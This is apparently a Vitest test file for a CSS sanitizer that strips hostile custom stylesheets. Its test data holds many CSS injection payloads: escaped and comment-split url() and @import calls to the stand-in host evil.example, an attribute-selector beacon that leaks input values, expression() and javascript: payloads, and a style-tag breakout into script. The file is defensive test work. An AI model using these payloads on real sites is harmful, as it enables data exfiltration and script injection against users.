import { describe, expect, it } from 'vitest';
import { MAX_CUSTOM_CSS_BYTES, sanitizeCss } from '@harmony/shared';

const clean = (css: string) => sanitizeCss(css).css;

/** What must never survive in sanitized output, however it was spelled in the input. */
function assertSafe(css: string): void {
  const flat = css;
  expect(flat).not.toMatch(/@import/i);
  expect(flat).not.toMatch(/expression\s*\(/i);
  expect(flat).not.toMatch(/-moz-binding/i);
  expect(flat).not.toMatch(/behavior:/i);
  expect(flat).not.toMatch(/javascript:/i);
  expect(flat).not.toMatch(/image-set\(/i);
  for (const match of css.matchAll(/url\s*\(([^)]*)\)/gi)) {
    expect(match[1]?.trim().replace(/^["']|["']$/g, '')).toMatch(
      /^data:image\/(?:png|gif|webp|jpeg);base64,[a-z0-9+/=]+$/i,
    );
  }
}

describe('sanitizeCss', () => {
  it('keeps ordinary CSS', () => {
    const css =
      '[data-harmony="message"]:hover { background: #fff; transition: all .2s } .a > .b::before { content: "\\201C" }';
    expect(clean(css)).toBe(css);
    expect(sanitizeCss(css).removed).toEqual([]);
  });

  it('keeps small inline raster images', () => {
    const css = 'a { background: url("data:image/png;base64,iVBORw0KGgo=") }';
    expect(clean(css)).toBe(css);
    expect(clean('a { background: url(data:image/webp;base64,AAAA) }')).toContain(
      'data:image/webp',
    );
  });

  it.each([
    ['remote url', 'a { background: url(https://evil.example/x.png) }'],
    ['quoted url', 'a { background: url("//evil.example/x") }'],
    ['single quoted', "a { background: url('http://evil.example') }"],
    ['uppercase', 'a { background: URL(http://evil.example) }'],
    ['mixed case', 'a { background: uRl(http://evil.example) }'],
    ['spaces', 'a { background: url(  http://evil.example  ) }'],
    ['comment inside', 'a { background: url(/**/http://evil.example) }'],
    ['escaped letter', 'a { background: u\\rl(http://evil.example) }'],
    ['escaped hex', 'a { background: \\75 rl(http://evil.example) }'],
    ['escaped hex padded', 'a { background: \\000075rl(http://evil.example) }'],
    ['fully escaped', 'a { background: \\75\\72\\6c(http://evil.example) }'],
    ['escaped inside the url', 'a { background: url(htt\\70://evil.example) }'],
    ['svg data', 'a { background: url(data:image/svg+xml;base64,PHN2Zz4=) }'],
    ['html data', 'a { background: url(data:text/html;base64,PGh0bWw+) }'],
    ['data with host tail', 'a { background: url(data:image/png;base64,AAAA/../../x) }'],
    ['unterminated', 'a { background: url(http://evil.example'],
    ['cursor', 'a { cursor: url(http://evil.example/c.cur), auto }'],
    ['content', 'a::after { content: url(http://evil.example) }'],
    ['attribute beacon', 'input[value^="a"] { background: url(http://evil.example/a) }'],
    ['image-set string', 'a { background: image-set("http://evil.example/a.png" 1x) }'],
    ['webkit image-set', 'a { background: -webkit-image-set("http://evil.example/a.png" 1x) }'],
    ['cross-fade', 'a { background: cross-fade(url(http://evil.example), red) }'],
    ['nested in image-set', 'a { background: image-set(url(http://evil.example) 1x) }'],
  ])('removes %s', (_name, css) => {
    const result = clean(css);
    expect(result).not.toContain('evil.example');
    assertSafe(result);
  });

  it.each([
    ['@import url', '@import url(https://evil.example/a.css);\na { color: red }'],
    ['@import string', '@import "https://evil.example/a.css";\na { color: red }'],
    ['uppercase', '@IMPORT "https://evil.example/a.css";\na { color: red }'],
    ['escaped', '@\\69mport "https://evil.example/a.css";\na { color: red }'],
    ['escaped at-rule name', '@\\000069mport "https://evil.example/a.css";\na { color: red }'],
    ['no semicolon', '@import "https://evil.example/a.css"'],
  ])('removes @import: %s', (_name, css) => {
    const result = clean(css);
    expect(result).not.toContain('evil.example');
    assertSafe(result);
  });

  it('treats a comment inside a name as a token break, which browsers ignore', () => {
    assertSafe(clean('a { background: u/**/rl(http://evil.example) }'));
    assertSafe(clean('@/**/import "https://evil.example/a.css";'));
  });

  it('keeps the rest of the stylesheet after removing @import', () => {
    expect(clean('@import "https://evil.example/a.css";\na { color: red }')).toBe(
      'a { color: red }',
    );
  });

  it('removes remote @font-face blocks but keeps local ones', () => {
    const remote =
      '@font-face { font-family: X; src: url(https://evil.example/x.woff2) }\na { color: red }';
    expect(clean(remote)).toBe('a { color: red }');
    expect(
      clean('@FONT-FACE { src: url("//evil.example/x") format("woff2") } b { color: blue }'),
    ).toBe('b { color: blue }');
    const local = '@font-face { font-family: X; src: local("Arial") }';
    expect(clean(local)).toBe(local);
  });

  it.each([
    ['expression', 'a { width: expression(alert(1)) }'],
    ['expression mixed case', 'a { width: ExPrEsSiOn(alert(1)) }'],
    ['expression escaped', 'a { width: \\65xpression(alert(1)) }'],
    ['expression comment', 'a { width: expr/**/ession(alert(1)) }'],
    ['behavior', 'a { behavior: url(x.htc) }'],
    ['-moz-binding', 'a { -moz-binding: url(x.xml#y) }'],
    ['-moz-binding escaped', 'a { -\\6d oz-binding: url(x.xml#y) }'],
    ['javascript', 'a { background: url(javascript:alert(1)) }'],
    ['javascript escaped', 'a { background: url(java\\73 cript:alert(1)) }'],
    ['javascript string', 'a { x: "javascript:alert(1)" }'],
  ])('removes %s', (_name, css) => {
    const result = clean(css);
    assertSafe(result);
    expect(result).not.toMatch(/x\.htc|x\.xml|javascript/i);
  });

  it('cannot be tricked into assembling a url( from the pieces it removes', () => {
    for (const css of [
      'a { background: ur@import "x";l(http://evil.example) }',
      'a { background: u-moz-binding:x;rl(http://evil.example) }',
      'a { background: urjavascript:l(http://evil.example) }',
      'a { background: expression(1)url(http://evil.example) }',
    ]) {
      const result = clean(css);
      expect(result).not.toContain('evil.example');
      assertSafe(result);
    }
  });

  it('drops closing style tags so the text cannot break out of its element', () => {
    expect(clean('a { color: red } </style><script>alert(1)</script>')).not.toMatch(
      /<\/?(?:style|script)/i,
    );
  });

  it('is idempotent', () => {
    const input =
      '@import "x"; a { background: u\\rl(http://e), url(data:image/gif;base64,R0lG) } /* c */ b { color: red }';
    const once = clean(input);
    expect(clean(once)).toBe(once);
  });

  it('reports what it removed', () => {
    expect(sanitizeCss('@import "x"; a { background: url(http://e) }').removed).toEqual(
      expect.arrayContaining(['@import', 'url()']),
    );
  });

  it('handles the size limit as a constant for callers', () => {
    expect(MAX_CUSTOM_CSS_BYTES).toBe(20480);
  });
});
